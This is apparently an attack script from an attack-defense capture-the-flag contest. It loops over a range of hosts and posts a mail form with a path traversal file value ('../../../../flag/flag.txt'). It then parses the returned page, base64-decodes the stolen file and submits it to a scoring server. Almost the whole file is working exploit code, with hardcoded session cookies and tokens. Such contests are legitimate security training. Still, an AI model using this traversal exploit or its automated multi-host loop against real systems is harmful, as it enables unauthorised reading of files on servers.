# POST /online/mail/new HTTP/1.1
# Host: 10.10.1.3:30004
# Content-Length: 95
# Accept: application/json, text/plain, */*
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
# Content-Type: application/json;charset=UTF-8
# Origin: http://10.10.1.3:30004
# Referer: http://10.10.1.3:30004/online/mail
# Accept-Encoding: gzip, deflate
# Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
# Cookie: connect.sid=s%3AJoI1KKzppThygJXsReV_vUz3EU6o-jt2.O%2FkIRJhS88ImF4b3zkqC6WBWPSDK37pwM1RNrxxzBII
# Connection: close

# {"name":"hello","number":"1-123-12345-12","contents":"aa","file":"1673588353111__download.php"}


import requests
import flag_shooter
import flag_manager
import time
import math
import random
import base64

def attack():
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'session=eyJ0ZWFtX2lkeCI6MX0.Y7_-KQ.-HgRrXK0SVI-UwIjSBWIi5yqPG8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    s = requests.Session() 
  
   
    for i in range(2, 17):
        try: 
            url = "http://10.10.1." + str(i) + ":30004/online/mail/new"
            url2 = "http://10.10.1." + str(i) + ":30004/online/mail/view"
            
            ran = "1-"+str(random.randint(1, 999)).rjust(3,"0")+"-"+str(random.randint(1, 99999)).rjust(5,"0")+"-10"
            print(ran)
        
            script_info1 = {
                "name":"j",
                "number":ran,
                "contents":"aa",
                "file": "../../../../flag/flag.txt"
            }
            cookies = {
                'connect.sid' :'s%3AuUQsRTT3RknCSKWo_FlQn8Q1RdRS7NFW.elkQkSpAsMgWZxrL16q9PR2KGl%2BJeqw40ge8p7h6nRw'
            }
            
            res1 = s.post(url, data=script_info1, cookies=cookies, headers=headers)        
            # print(res1.text)
            
            script_info2 = {
                "name":"j",
                "number":ran
            }
            
            
            res2 = s.post(url2, data=script_info2, cookies=cookies, headers=headers)
            # print(res2.text)
            pos = res2.text.find('<th scope="row">') + len('<th scope="row">')
            num = res2.text[pos:pos+4]
            # print(res2.text[pos:pos+3])
            
            res3 = s.get(url2 +"/"+ str(num), cookies=cookies, headers=headers)
            # print(res3.text)
            
            pos = res3.text.find('<img src="data:image/png;base64,') + len('<img src="data:image/png;base64,')
            end = res3.text.find("&#x3D;&#x3D;",pos) + len('&#x3D;&#x3D;')
            # print(pos, end)
            base = res3.text[pos:end].replace("&#x3D;&#x3D;", "==")
            
            flag = base64.b64decode(base).decode('utf-8')
            print(flag)
            
                
            #     pos = res.text.find("결과</h2><pre>") + len("결과</h2><pre>")
            #     if pos == -1:
            #         continue
            #     res.text[pos: pos+64]
            #     if len(res.text[pos: pos+64]) != 64:
            #         continue
            #     if "<" in res.text[pos: pos+64]:
            #         continue
            #     flag = res.text[pos: pos+64]
            #     print(flag)
                

            headers = {
                'Accept': '*/*',
                'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'Cookie': 'session=eyJ0ZWFtX2lkeCI6MX0.Y7_-KQ.-HgRrXK0SVI-UwIjSBWIi5yqPG8',
                'Origin': 'http://15.165.15.245',
                'Referer': 'http://15.165.15.245/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
            }
            session = "eyJ0ZWFtX2lkeCI6MX0.Y8Cfgg.zgqLfuvqkANsT1MTDvPBeeFtGos",
            flag_shooter.auth("http://3.38.255.21", flag, session)
        
        except:
            continue



def main():
    attack()

if __name__ == "__main__":
    main()